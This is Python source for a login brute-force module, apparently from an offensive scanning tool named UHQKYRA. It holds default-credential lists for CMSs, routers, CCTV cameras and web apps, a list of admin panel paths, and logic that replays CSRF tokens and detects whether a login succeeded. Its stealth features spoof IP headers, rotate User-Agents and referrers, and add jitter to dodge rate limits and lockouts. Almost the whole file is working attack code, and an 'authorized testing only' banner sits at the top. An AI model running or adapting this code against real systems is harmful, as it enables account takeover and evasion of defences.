"""
Login Brute Force / Default Credentials - UHQKYRA v5.1
=======================================================
⚠️ Authorized security testing only.

Features:
  - 154 unique credentials (generic + CMS/framework-specific)
  - 82 admin panel paths
  - Smart login form detection (username/email/password fields)
  - CSRF token extraction and replay
  - Redirect & content-diff success detection
  - HTTP Basic Auth testing
  - JSON login endpoint testing
  - Rate-limit / lockout detection
  - CMS fingerprint → use targeted cred list
  - Hash type identifier for dumped hashes
  STEALTH (v5.1):
  - Per-request User-Agent rotation (120+ UAs)
  - Random IP spoofing headers (X-Forwarded-For, X-Real-IP…)
  - Referrer chain spoofing (looks like Google/Bing traffic)
  - Burst jitter (avoid rate-limit triggers)
  - Fresh session per login attempt (new cookie jar)
  - Accept/Accept-Language header randomization
"""
import re
import time
import random
import warnings
warnings.filterwarnings("ignore")

try:
    import requests
    requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from modules.evasion import (
        random_ua, random_headers, waf_bypass_headers,
        burst_jitter, jitter, slow_jitter,
    )
    HAS_EVASION = True
except ImportError:
    try:
        from evasion import (
            random_ua, random_headers, waf_bypass_headers,
            burst_jitter, jitter, slow_jitter,
        )
        HAS_EVASION = True
    except ImportError:
        HAS_EVASION = False
        def random_ua(): return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        def random_headers(**kw): return {"User-Agent": random_ua()}
        def burst_jitter(): pass
        def jitter(*a, **kw): pass
        def slow_jitter(*a, **kw): time.sleep(0.2)

# Base headers — random_headers() is called per-request for full rotation
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}


def _stealth_session():
    """Create a new requests.Session with fresh stealth headers"""
    if not HAS_REQUESTS:
        return None
    import requests as _r
    _r.packages.urllib3.disable_warnings()
    s = _r.Session()
    s.headers.update(random_headers(include_ip_spoof=True, include_referrer=True))
    s.verify = False
    s.max_redirects = 5
    return s

# ─────────────────────────────────────────────────────────────────────────────
# CREDENTIAL LISTS (250+)
# ─────────────────────────────────────────────────────────────────────────────

# Generic / universal credentials
GENERIC_CREDS = [
    # admin variants
    ("admin",         "admin"),
    ("admin",         "admin123"),
    ("admin",         "Admin123"),
    ("admin",         "Admin@123"),
    ("admin",         "admin@123"),
    ("admin",         "password"),
    ("admin",         "Password1"),
    ("admin",         "P@ssw0rd"),
    ("admin",         "P@$$w0rd"),
    ("admin",         "123456"),
    ("admin",         "1234567890"),
    ("admin",         "12345"),
    ("admin",         "1234"),
    ("admin",         "123"),
    ("admin",         "qwerty"),
    ("admin",         "letmein"),
    ("admin",         "welcome"),
    ("admin",         "welcome1"),
    ("admin",         "monkey"),
    ("admin",         "dragon"),
    ("admin",         "master"),
    ("admin",         "pass"),
    ("admin",         "pass123"),
    ("admin",         "changeme"),
    ("admin",         "default"),
    ("admin",         "secret"),
    ("admin",         "test"),
    ("admin",         "test123"),
    ("admin",         ""),
    ("admin",         "admin1"),
    ("admin",         "admin12"),
    ("admin",         "root"),
    ("admin",         "toor"),
    ("admin",         "alpine"),
    ("admin",         "0000"),
    ("admin",         "1111"),
    ("admin",         "4321"),
    ("admin",         "nimda"),
    # administrator
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("administrator", "admin"),
    ("administrator", "123456"),
    ("administrator", ""),
    # root
    ("root",          "root"),
    ("root",          "toor"),
    ("root",          "password"),
    ("root",          "123456"),
    ("root",          "alpine"),
    ("root",          ""),
    ("root",          "admin"),
    # user
    ("user",          "user"),
    ("user",          "password"),
    ("user",          "123456"),
    ("user",          "user123"),
    # test
    ("test",          "test"),
    ("test",          "test123"),
    ("test",          "password"),
    ("test",          "123456"),
    # guest
    ("guest",         "guest"),
    ("guest",         "password"),
    ("guest",         "123456"),
    # demo
    ("demo",          "demo"),
    ("demo",          "password"),
    # operator
    ("operator",      "operator"),
    ("operator",      "password"),
    # support
    ("support",       "support"),
    ("support",       "password"),
    # manager
    ("manager",       "manager"),
    ("manager",       "password"),
    # service
    ("service",       "service"),
    # backup
    ("backup",        "backup"),
    # info
    ("info",          "info"),
]

# WordPress specific
WORDPRESS_CREDS = [
    ("admin",     "admin"),
    ("admin",     "password"),
    ("admin",     "wordpress"),
    ("admin",     "123456"),
    ("admin",     "letmein"),
    ("wordpress", "wordpress"),
    ("wpadmin",   "wpadmin"),
    ("webmaster", "webmaster"),
    ("editor",    "editor"),
    ("author",    "author"),
]

# Joomla specific
JOOMLA_CREDS = [
    ("admin",   "admin"),
    ("admin",   "password"),
    ("admin",   "joomla"),
    ("admin",   "joomla123"),
    ("joomla",  "joomla"),
    ("super",   "super"),
    ("manager", "manager"),
]

# Drupal specific
DRUPAL_CREDS = [
    ("admin",    "admin"),
    ("admin",    "drupal"),
    ("admin",    "password"),
    ("drupal",   "drupal"),
    ("drupal",   "password"),
    ("webmaster","webmaster"),
]

# phpMyAdmin / MySQL
PHPMYADMIN_CREDS = [
    ("root",   ""),
    ("root",   "root"),
    ("root",   "mysql"),
    ("root",   "password"),
    ("root",   "toor"),
    ("root",   "123456"),
    ("mysql",  "mysql"),
    ("admin",  "admin"),
    ("admin",  "mysql"),
    ("pma",    "pma"),
    ("pma",    ""),
    ("dbadmin","dbadmin"),
]

# Routers / Network devices
ROUTER_CREDS = [
    ("admin",   "admin"),
    ("admin",   "password"),
    ("admin",   "1234"),
    ("admin",   "12345"),
    ("admin",   "123456"),
    ("admin",   "0000"),
    ("admin",   ""),
    ("user",    "user"),
    ("user",    "password"),
    ("root",    "admin"),
    ("root",    "root"),
    ("root",    "password"),
    ("root",    ""),
    ("ubnt",    "ubnt"),
    ("cisco",   "cisco"),
    ("cisco",   "cisco123"),
    ("admin",   "cisco"),
    ("enable",  "enable"),
    ("netgear", "password"),
    ("admin",   "netgear"),
    ("admin",   "1234567890"),
    ("admin",   "motorola"),
    ("admin",   "comcast"),
    ("admin",   "xfinity"),
    ("admin",   "asus"),
    ("admin",   "TP-Link"),
    ("admin",   "tp-link"),
    ("admin",   "linksys"),
    ("admin",   "belkin"),
    ("admin",   "dlink"),
    ("admin",   "D-Link"),
    ("support", "support"),
    ("support", ""),
    ("cusadmin","highspeed"),
    ("mso",     "mso"),
    ("technician","technician"),
]

# CCTV / DVR / NVR cameras
CAMERA_CREDS = [
    ("admin",   "admin"),
    ("admin",   "12345"),
    ("admin",   "123456"),
    ("admin",   ""),
    ("admin",   "4321"),
    ("admin",   "1111"),
    ("admin",   "2222"),
    ("admin",   "dahua"),
    ("admin",   "hikvision"),
    ("666666",  "666666"),
    ("888888",  "888888"),
    ("root",    "root"),
    ("root",    "xmhdipc"),
    ("root",    "jvbzd"),
    ("service", "service"),
    ("supervisor","supervisor"),
]

# Apache Tomcat / Jenkins / Grafana / etc.
WEBAPP_CREDS = [
    # Tomcat
    ("tomcat",   "tomcat"),
    ("tomcat",   "s3cret"),
    ("both",     "tomcat"),
    ("role1",    "tomcat"),
    ("manager",  "manager"),
    ("manager",  "secret"),
    ("admin",    "tomcat"),
    # Jenkins
    ("admin",    "admin"),
    ("jenkins",  "jenkins"),
    ("admin",    "jenkins"),
    # Grafana
    ("admin",    "admin"),
    ("grafana",  "grafana"),
    # Kibana / Elasticsearch
    ("elastic",  "elastic"),
    ("elastic",  "changeme"),
    ("kibana",   "kibana"),
    # Redis
    ("",         "redis"),
    ("",         "foobared"),
    # MongoDB
    ("admin",    "password"),
    # Spring Boot Actuator / default
    ("user",     "user"),
    ("user",     "password"),
    # Nagios
    ("nagiosadmin","nagiosadmin"),
    ("nagios",   "nagios"),
    # Zabbix
    ("Admin",    "zabbix"),
    ("admin",    "zabbix"),
    # Confluence / Jira / Atlassian
    ("admin",    "admin"),
    ("sysadmin", "sysadmin"),
    # cPanel
    ("root",     "password"),
    ("cpanel",   "cpanel"),
    # Plesk
    ("admin",    "setup"),
    # OpenVPN Access Server
    ("openvpn",  "openvpn"),
    ("admin",    "openvpn"),
    # Webmin
    ("root",     "root"),
    ("admin",    "webmin"),
    # GitLab
    ("root",     "5iveL!fe"),
    ("root",     "gitlabpassword"),
    ("admin",    "gitlab"),
    # Gitea
    ("gitea",    "gitea"),
    # Nextcloud
    ("admin",    "admin"),
    ("ncadmin",  "ncadmin"),
    # Portainer
    ("admin",    "portainer"),
    # Pi-hole
    ("admin",    "pihole"),
    # pfSense
    ("admin",    "pfsense"),
    # OPNsense
    ("root",     "opnsense"),
    # Raspberry Pi OS
    ("pi",       "raspberry"),
    ("pi",       "pi"),
    ("root",     "raspberry"),
    # VMware ESXi
    ("root",     "vmware"),
    ("root",     ""),
    # Proxmox
    ("root",     "proxmox"),
]

# Combined master list (deduplicated)
def _build_master_creds():
    seen = set()
    result = []
    for lst in [GENERIC_CREDS, WORDPRESS_CREDS, JOOMLA_CREDS, DRUPAL_CREDS,
                PHPMYADMIN_CREDS, ROUTER_CREDS, CAMERA_CREDS, WEBAPP_CREDS]:
        for u, p in lst:
            k = (u.lower(), p.lower())
            if k not in seen:
                seen.add(k)
                result.append((u, p))
    return result

ALL_CREDS = _build_master_creds()

# ─────────────────────────────────────────────────────────────────────────────
# ADMIN PANEL PATHS (40+)
# ─────────────────────────────────────────────────────────────────────────────

ADMIN_PATHS = [
    "/admin",
    "/admin/",
    "/admin/login",
    "/admin/login.php",
    "/admin/index.php",
    "/administrator",
    "/administrator/index.php",
    "/wp-admin",
    "/wp-login.php",
    "/wp-admin/",
    "/wp-admin/admin.php",
    "/login",
    "/login.php",
    "/login.asp",
    "/login.aspx",
    "/login.html",
    "/signin",
    "/sign-in",
    "/auth/login",
    "/auth/signin",
    "/user/login",
    "/users/sign_in",
    "/account/login",
    "/accounts/login",
    "/panel",
    "/panel/login",
    "/cpanel",
    "/webmail",
    "/phpmyadmin",
    "/phpmyadmin/index.php",
    "/pma",
    "/mysql",
    "/db",
    "/database",
    "/dbadmin",
    "/adminer",
    "/adminer.php",
    "/manager",
    "/manager/html",
    "/manager/status",
    "/joomla/administrator",
    "/joomla/index.php/administrator",
    "/portal",
    "/portal/login",
    "/dashboard",
    "/backend",
    "/backend/login",
    "/control",
    "/controlpanel",
    "/secure",
    "/secure/login",
    "/auth",
    "/security",
    "/api/login",
    "/api/auth",
    "/api/v1/login",
    "/api/v2/login",
    "/rest/login",
    "/service/login",
    "/index.php?route=account/login",
    "/index.php/admin",
    "/siteadmin",
    "/adminpanel",
    "/webadmin",
    "/sysadmin",
    "/system/admin",
    "/cms",
    "/cms/login",
    "/_admin",
    "/secret",
    "/secret/login",
    "/private",
    "/private/login",
    "/staff",
    "/staff/login",
    "/employee",
    "/employees",
    "/console",
    "/console/login",
    "/manage",
    "/manage/login",
    "/management",
]

# ─────────────────────────────────────────────────────────────────────────────
# HASH DETECTION
# ─────────────────────────────────────────────────────────────────────────────

HASH_PATTERNS = [
    (r'^[a-f0-9]{32}$',                       "MD5"),
    (r'^[a-f0-9]{40}$',                       "SHA-1"),
    (r'^[a-f0-9]{56}$',                       "SHA-224"),
    (r'^[a-f0-9]{64}$',                       "SHA-256"),
    (r'^[a-f0-9]{96}$',                       "SHA-384"),
    (r'^[a-f0-9]{128}$',                      "SHA-512"),
    (r'^\$2[ayb]\$\d{2}\$.{53}$',            "bcrypt"),
    (r'^\$1\$.{8}\$.{22}$',                   "MD5-crypt"),
    (r'^\$5\$.{8}\$.{43}$',                   "SHA-256-crypt"),
    (r'^\$6\$.{8}\$.{86}$',                   "SHA-512-crypt"),
    (r'^\$apr1\$.{8}\$.{22}$',                "APR1-MD5"),
    (r'^[a-f0-9]{32}:[a-f0-9]{32}$',         "MD5:Salt"),
    (r'^[a-zA-Z0-9]{22}$',                    "DES-crypt"),
    (r'^\*[A-F0-9]{40}$',                     "MySQL4.1+"),
    (r'^[a-f0-9]{16}$',                       "MySQL < 4.1"),
    (r'^\{SHA\}[A-Za-z0-9+/=]{28}$',         "SHA-1 Base64"),
    (r'^\{SSHA\}[A-Za-z0-9+/=]{40}$',        "SSHA"),
    (r'^[A-Za-z0-9+/=]{24}$',                "Base64"),
]


def identify_hash(h):
    """Returns hash type string or 'Unknown'"""
    h = h.strip()
    for pattern, name in HASH_PATTERNS:
        if re.match(pattern, h, re.I):
            return name
    return "Unknown"


# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def _find_field(html, candidates):
    """Return the name attribute of an input field matching candidates"""
    for cand in candidates:
        m = re.search(
            rf'<input[^>]+name=["\']([^"\']*{cand}[^"\']*)["\'][^>]*type=["\'](?:text|email|password)["\']'
            rf'|<input[^>]+type=["\'](?:text|email|password)["\'][^>]+name=["\']([^"\']*{cand}[^"\']*)["\']',
            html, re.I
        )
        if m:
            return next(v for v in m.groups() if v)
    # Fallback: find any input by type
    for cand in candidates:
        m = re.search(rf'<input[^>]+name=["\']([^"\']*{cand}[^"\']*)["\']', html, re.I)
        if m:
            return m.group(1)
    return None


def _get_all_csrf(html):
    """Extract all hidden input fields (for CSRF tokens)"""
    hidden = {}
    for m in re.finditer(
        r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']'
        r'|<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']hidden["\'][^>]+value=["\']([^"\']*)["\']'
        r'|<input[^>]+value=["\']([^"\']*)["\'][^>]+name=["\']([^"\']+)["\'][^>]+type=["\']hidden["\']',
        html, re.I
    ):
        groups = [g for g in m.groups() if g is not None]
        if len(groups) >= 2:
            name, val = groups[0], groups[1]
            hidden[name] = val
    return hidden


def _get_csrf(response):
    """Return (name, value) of CSRF token from response, or (None, None)"""
    csrf_names = ["_token", "csrf_token", "csrfmiddlewaretoken",
                  "__RequestVerificationToken", "authenticity_token",
                  "_csrf", "csrf", "token", "_csrf_token", "nonce"]
    hidden = _get_all_csrf(response.text)
    for name in csrf_names:
        for k, v in hidden.items():
            if name.lower() in k.lower():
                return k, v
    # Meta tag fallback
    m = re.search(r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
                  response.text, re.I)
    if m:
        return "csrf-token", m.group(1)
    return None, None


def _detect_cms(html, url):
    """Detect CMS type from page HTML/URL"""
    html_l = html.lower()
    url_l  = url.lower()
    if "wp-login.php" in url_l or "wp-content" in html_l or "wordpress" in html_l:
        return "wordpress"
    if "joomla" in html_l or "/administrator" in url_l:
        return "joomla"
    if "drupal" in html_l or "drupal.js" in html_l:
        return "drupal"
    if "phpmyadmin" in html_l or "phpmyadmin" in url_l or "pmahomepage" in html_l:
        return "phpmyadmin"
    if "tomcat" in html_l or "manager" in url_l:
        return "tomcat"
    if "jenkins" in html_l:
        return "jenkins"
    if "grafana" in html_l:
        return "grafana"
    return "generic"


def _get_targeted_creds(cms):
    """Return (deduplicated) cred list for detected CMS, then generic"""
    seen = set()
    result = []
    cms_map = {
        "wordpress":  WORDPRESS_CREDS,
        "joomla":     JOOMLA_CREDS,
        "drupal":     DRUPAL_CREDS,
        "phpmyadmin": PHPMYADMIN_CREDS,
        "tomcat":     WEBAPP_CREDS,
        "jenkins":    WEBAPP_CREDS,
        "grafana":    WEBAPP_CREDS,
    }
    priority = cms_map.get(cms, [])
    for lst in [priority, GENERIC_CREDS]:
        for u, p in lst:
            k = (u.lower(), p.lower())
            if k not in seen:
                seen.add(k)
                result.append((u, p))
    # Append remaining ALL_CREDS
    for u, p in ALL_CREDS:
        k = (u.lower(), p.lower())
        if k not in seen:
            seen.add(k)
            result.append((u, p))
    return result


def _is_login_success(resp, baseline_html, login_url=""):
    """Multi-signal login success detection"""
    text = resp.text
    text_l = text.lower()

    # Hard fail patterns
    fail_patterns = [
        "invalid", "incorrect", "wrong password", "wrong credentials",
        "failed", "error", "bad credentials", "invalid credentials",
        "username or password", "login failed", "not found",
        "unauthorized", "access denied", "please try again",
        "mot de passe", "identifiant incorrect", "échec",
        "too many", "locked", "blocked", "captcha",
    ]
    # Count fail signals
    fail_score = sum(1 for p in fail_patterns if p in text_l)

    # Success patterns
    success_patterns = [
        "dashboard", "welcome", "logout", "log out", "sign out",
        "my account", "my profile", "profile", "logged in",
        "home page", "overview", "administration", "control panel",
        "settings", "hello,", "bonjour", "bienvenue",
    ]
    success_score = sum(1 for p in success_patterns if p in text_l)

    # Redirect detection
    if resp.status_code in (301, 302, 303):
        loc = resp.headers.get("Location", "")
        if loc and "login" not in loc.lower() and "signin" not in loc.lower():
            return True

    # Content length delta (vs baseline)
    base_len = len(baseline_html)
    resp_len = len(text)
    delta    = abs(resp_len - base_len)

    # If fail patterns dominate → not a success
    if fail_score >= 2:
        return False
    if success_score >= 1 and fail_score == 0:
        return True
    # Large delta and no fail patterns
    if delta > 1000 and fail_score == 0:
        return True

    return False


def _test_http_basic(url, creds_list, callback=None):
    """Test HTTP Basic/Digest auth — stealth: fresh UA per attempt"""
    def cb(t, m):
        if callback: callback({"type": t, "message": m})
    found = []
    if not HAS_REQUESTS:
        return found
    try:
        r = requests.get(url, timeout=8, verify=False,
                         headers=random_headers())
        if r.status_code != 401:
            return found
        cb("info", f"🔑 HTTP Basic Auth détecté: {url}")
        for u, p in creds_list[:80]:
            try:
                burst_jitter()
                r2 = requests.get(url, auth=(u, p), timeout=8,
                                   verify=False,
                                   headers=random_headers(include_ip_spoof=True))
                if r2.status_code == 200:
                    found.append({"username": u, "password": p, "url": url})
                    cb("vuln", f"🚨 HTTP Basic Auth: {u}:{p} sur {url}")
                    break
            except Exception:
                pass
    except Exception:
        pass
    return found


def _test_json_login(url, user_field, pass_field, creds_list, callback=None):
    """Test JSON-based login endpoints"""
    def cb(t, m):
        if callback: callback({"type": t, "message": m})
    found = []
    if not HAS_REQUESTS:
        return found
    json_paths = ["/api/login", "/api/auth", "/api/v1/auth",
                  "/api/v1/login", "/api/v2/login", "/auth/token", "/api/token"]
    import urllib.parse as _up
    base = _up.urlparse(url)
    base_url = f"{base.scheme}://{base.netloc}"

    for path in json_paths:
        ep = base_url + path
        try:
            r0 = requests.get(ep, timeout=6, verify=False, headers=HEADERS)
            if r0.status_code in (404,):
                continue
            for u, p in creds_list[:30]:
                payload = {user_field or "username": u, pass_field or "password": p}
                try:
                    r = requests.post(ep, json=payload, timeout=8,
                                       verify=False, headers=HEADERS)
                    if r.status_code == 200:
                        txt = r.text.lower()
                        if any(k in txt for k in ["token", "access", "session", "success", "true"]):
                            found.append({"username": u, "password": p, "url": ep, "type": "json"})
                            cb("vuln", f"🚨 JSON Auth: {u}:{p} → {ep}")
                            break
                except Exception:
                    pass
        except Exception:
            pass
    return found


# ─────────────────────────────────────────────────────────────────────────────
# MAIN FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────

def find_admin_panels(base_url, callback=None):
    """
    Find admin/login panels across 82 known paths.
    Stealth: fresh UA + IP spoof + referrer per request, jitter.
    """
    def cb(t, m):
        if callback: callback({"type": t, "message": m})

    found = []
    if not HAS_REQUESTS:
        return found

    base = (base_url if "://" in base_url else "http://" + base_url).rstrip("/")
    cb("info", f"🔑 Recherche panneaux admin sur {base} ({len(ADMIN_PATHS)} chemins)...")

    # Use a stealth session — UA rotates per request
    s = _stealth_session()
    if not s:
        return found

    for path in ADMIN_PATHS:
        url = base + path
        try:
            # Rotate headers on every request
            s.headers.update(random_headers(include_ip_spoof=True, include_referrer=True))
            burst_jitter()
            r = s.get(url, timeout=8, allow_redirects=True)
            code = r.status_code
            if code in (200, 401, 403):
                html = r.text.lower()
                is_login = (
                    re.search(r'<input[^>]+type=["\']password["\']', r.text, re.I) or
                    any(k in html for k in ["login", "sign in", "username", "email", "password"])
                )
                if is_login or code == 401:
                    cms = _detect_cms(r.text, r.url)
                    found.append({
                        "url":    r.url,
                        "path":   path,
                        "status": code,
                        "cms":    cms,
                        "auth_type": "basic" if code == 401 else "form",
                    })
                    cb("found", f"🔑 Panel admin: {r.url} [{code}] CMS={cms}")
        except Exception:
            continue

    cb("info", f"🔑 {len(found)} panel(s) admin trouvé(s)")
    return found


def test_login_form(url, callback=None, max_creds=None):
    """
    Test a single login form URL with default credentials.
    Returns detailed result dict.
    """
    def cb(t, m):
        if callback: callback({"type": t, "message": m})

    results = {
        "login_found": False,
        "login_url":   url,
        "cms":         "generic",
        "vulnerable":  False,
        "cracked_creds": [],
        "vulnerabilities": [],
        "findings": [],
        "attempts": 0,
        "auth_type": "form",
        "rate_limited": False,
    }

    if not HAS_REQUESTS:
        cb("error", "requests non disponible")
        return results

    # Stealth session with rotating headers
    s = _stealth_session()
    if not s:
        return results

    # First check HTTP Basic Auth
    try:
        s.headers.update(random_headers(include_ip_spoof=True))
        r0 = s.get(url, timeout=10, allow_redirects=True)
        if r0.status_code == 401:
            results["auth_type"] = "basic"
            results["login_found"] = True
            basic_found = _test_http_basic(url, ALL_CREDS, callback=callback)
            if basic_found:
                results["vulnerable"] = True
                results["cracked_creds"].extend(basic_found)
                for c in basic_found:
                    results["vulnerabilities"].append({
                        "type":     "default_credentials",
                        "severity": "critical",
                        "name":     f"HTTP Basic Auth: {c['username']}:{c['password']}",
                        "detail":   url,
                    })
            return results
    except Exception:
        return results

    # Check if it's a login form
    try:
        r = s.get(url, timeout=10, allow_redirects=True)
    except Exception:
        return results

    html = r.text
    if not re.search(r'<input[^>]+type=["\']password["\']', html, re.I):
        cb("warn", f"🔑 Pas de formulaire password détecté sur {url}")
        return results

    results["login_found"] = True
    results["login_url"]   = r.url

    # Detect CMS and pick targeted creds
    cms = _detect_cms(html, r.url)
    results["cms"] = cms
    creds = _get_targeted_creds(cms)
    if max_creds:
        creds = creds[:max_creds]

    cb("info", f"🔑 CMS={cms} | {len(creds)} credentials à tester sur {r.url}...")

    # Extract form fields
    user_candidates = ["username", "user", "email", "login", "name", "uname",
                       "userid", "user_name", "user_login", "log"]
    pass_candidates = ["password", "pass", "passwd", "pwd", "mot_de_passe",
                       "pass1", "password1", "user_pass", "pwd1"]

    user_field = _find_field(html, user_candidates)
    pass_field = _find_field(html, pass_candidates)

    if not user_field or not pass_field:
        cb("warn", f"🔑 Champs login non détectés sur {url}")
        # Try JSON auth as fallback
        json_found = _test_json_login(url, None, None, creds[:30], callback=callback)
        if json_found:
            results["vulnerable"] = True
            results["cracked_creds"].extend(json_found)
        return results

    cb("info", f"🔑 Champs: user='{user_field}' pass='{pass_field}'")

    # Baseline response (wrong creds reference)
    baseline_html = html

    consecutive_limit = 0
    for username, password in creds:
        try:
            # ── Stealth: fresh UA + IP spoof + referrer per attempt ──
            s.headers.update(random_headers(include_ip_spoof=True, include_referrer=True))
            burst_jitter()   # random pause between attempts

            # Re-fetch to get fresh CSRF token (also rotates headers)
            s.headers.update(random_headers(include_ip_spoof=True))
            r_fresh = s.get(r.url, timeout=10, allow_redirects=True)
            csrf_name, csrf_val = _get_csrf(r_fresh)
            hidden = _get_all_csrf(r_fresh.text)

            data = {user_field: username, pass_field: password}
            # Add all hidden fields (CSRF tokens, honeypots, etc.)
            data.update(hidden)
            if csrf_name and csrf_val:
                data[csrf_name] = csrf_val

            # Rotate again for the POST
            s.headers.update(random_headers(include_ip_spoof=True, include_referrer=True))
            resp = s.post(r.url, data=data, timeout=12, allow_redirects=True)
            results["attempts"] += 1

            # Rate limit detection
            if resp.status_code in (429, 423, 503):
                consecutive_limit += 1
                if consecutive_limit >= 3:
                    results["rate_limited"] = True
                    cb("warn", f"🔑 Rate-limit/lockout détecté après {results['attempts']} tentatives")
                    break
                slow_jitter(2, 5)   # longer pause before retry
                continue
            else:
                consecutive_limit = 0

            if _is_login_success(resp, baseline_html, r.url):
                results["vulnerable"] = True
                cred_entry = {"username": username, "password": password, "url": r.url}
                results["cracked_creds"].append(cred_entry)
                results["vulnerabilities"].append({
                    "type":     "default_credentials",
                    "severity": "critical",
                    "name":     f"Credentials par défaut: {username}:{password}",
                    "detail":   r.url,
                })
                results["findings"].append({
                    "type":     "default_credentials",
                    "severity": "critical",
                    "name":     f"Credentials par défaut: {username}:{password}",
                    "detail":   r.url,
                })
                cb("vuln", f"🚨 LOGIN RÉUSSI! {username}:{password} → {r.url}")
                # Don't break — try all to find all valid creds (up to 3)
                if len(results["cracked_creds"]) >= 3:
                    break

        except Exception:
            pass

    if not results["vulnerable"]:
        cb("ok", f"🔑 Aucun credential par défaut ({results['attempts']} testés)")

    return results


def find_login_pages(base_url, callback=None):
    """Find login pages using ADMIN_PATHS list"""
    return find_admin_panels(base_url, callback=callback)


def scan_login_bruteforce(base_url, callback=None):
    """
    Full workflow:
      1. Find all admin/login panels
      2. Test HTTP Basic Auth
      3. Brute-force login forms
      4. Test JSON auth endpoints
    Returns aggregated results.
    """
    def cb(t, m):
        if callback: callback({"type": t, "message": m})

    all_res = {
        "login_pages":     [],
        "cracked_creds":   [],
        "vulnerabilities": [],
        "attempts":        0,
        "rate_limited":    False,
        "cms_detected":    [],
    }

    panels = find_admin_panels(base_url, callback=callback)
    all_res["login_pages"] = [p["url"] for p in panels]

    if not panels:
        cb("warn", "🔑 Aucun panneau admin/login trouvé")
        # Still test the base URL
        r = test_login_form(base_url, callback=callback, max_creds=50)
        if r["login_found"]:
            all_res["cracked_creds"].extend(r.get("cracked_creds", []))
            all_res["vulnerabilities"].extend(r.get("vulnerabilities", []))
            all_res["attempts"] += r.get("attempts", 0)
        return all_res

    tested_urls = set()
    for panel in panels[:5]:   # test up to 5 panels
        url = panel["url"]
        if url in tested_urls:
            continue
        tested_urls.add(url)

        cms = panel.get("cms", "generic")
        if cms not in all_res["cms_detected"]:
            all_res["cms_detected"].append(cms)

        res = test_login_form(url, callback=callback)
        all_res["cracked_creds"].extend(res.get("cracked_creds", []))
        all_res["vulnerabilities"].extend(res.get("vulnerabilities", []))
        all_res["attempts"] += res.get("attempts", 0)
        if res.get("rate_limited"):
            all_res["rate_limited"] = True

        if all_res["cracked_creds"]:
            cb("vuln", f"🚨 {len(all_res['cracked_creds'])} credential(s) trouvé(s)!")

    return all_res
